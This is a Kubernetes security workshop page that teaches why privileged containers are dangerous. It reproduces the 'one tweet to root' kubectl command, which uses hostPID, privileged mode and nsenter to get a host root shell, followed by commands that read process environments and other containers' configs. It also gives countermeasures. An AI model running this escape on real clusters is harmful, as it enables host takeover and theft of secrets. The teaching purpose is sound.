+++
categories = []
date = "2020-02-22"
description = ""
slug = ""
tags = []
title = "Avoid privileged mode"
draft = false
toc = true
weight = 65
+++

### Introduction
In this exercise, we cover:

 - What `--privileged` mode does
 - The crazy things it allows
 - How you might be able to replace it

### Setup
We'll exec directly into a container in this example.

This example is based on Ian Coldwater and Duffie Cooley's example from [Black Hat USA 2019](https://github.com/mauilion/blackhat-2019).

As a preliminary step, we'll deploy nginx and then spy on it later.
_(Note: adjust the replica count to match the number of nodes in your cluster.)_

```
kubectl create deployment nginx --image=nginx:stable
kubectl scale deployment nginx --replicas 2
kubectl get pods -w
```

To start, we'll use [Duffie Cooley's "one tweet to root"](https://twitter.com/mauilion/status/1129468485480751104)—it takes less than 280 characters!

```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

Here's that spec again, pretty-printed:
```json
{
  "spec": {
    "hostPID": true,
    "containers": [
      {
        "name": "1",
        "image": "alpine",
        "command": [
          "nsenter",
          "--mount=/proc/1/ns/mnt",
          "--",
          "/bin/bash"
        ],
        "stdin": true,
        "tty": true,
        "securityContext": {
          "privileged": true
        }
      }
    ]
  }
}
```

You'll notice:

 - `"hostPID": true` — The container is entering the host's process (PID) namespace
 - `"privileged": true` — The container is running in `--privileged` mode
 - `"stdin": true, "tty": true` — We'll attach a terminal to the running container when it starts
 - `"command"` — It's going to start out using `nsenter` to go into the **host**'s PID 1 (first process)

### "Attack"
Once we are in this shell, we can do some fun stuff to explore the host and learn about other processes and containers.

```
ls /proc/*/environ

pgrep -a nginx
(nsenter -n -t $(pgrep nginx | head -n1) ss -ln)
(nsenter -m -t $(pgrep nginx | head -n1) cat /etc/nginx/nginx.conf)

(nsenter -m -t 1 cat /etc/resolv.conf)
```

Can you think of anything else you'd want to do to the host while we're here?

### Countermeasure
Avoid `--privileged` mode and `hostPID` unless super necessary.

Consider applying admission control (using a dynamic admission controller or a `PodSecurityPolicy`) to block privileged containers by default.

### Attack effects after patching

Let's start just changing `hostPID: false`.

```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{ "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

We can also try with `privileged: false`:
```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true}]}}'
```

Note that neither succeeds because we either lack `/bin/bash` (a side-effect of staying in our Alpine container's `pid 1` instead of the host's) or we can't actually mount the process's mount (a side-effect of not being `--privileged`).

### How to use it yourself
Use the capabilities setting in the `securityContext` rather than privileged mode, if you can.
There are limited circumstances where you can and can't do this, which are hard to enumerate.

To know what caps you need, consider [`capable`](http://www.brendangregg.com/blog/2016-10-01/linux-bcc-security-capabilities.html).

Remember that all of these changes should go through CI and testing, like any code change.
You need to be sure all of your important flows are exercised if you want to have confidence in this change.

### Advertisement
Go see Maya and Frenchie's talk tomorrow at 11am about privileged containers!

### Next up
We'll cover Linux capabilities in the next exercise:

[**Minimize Linux capabilities**](../70-caps)
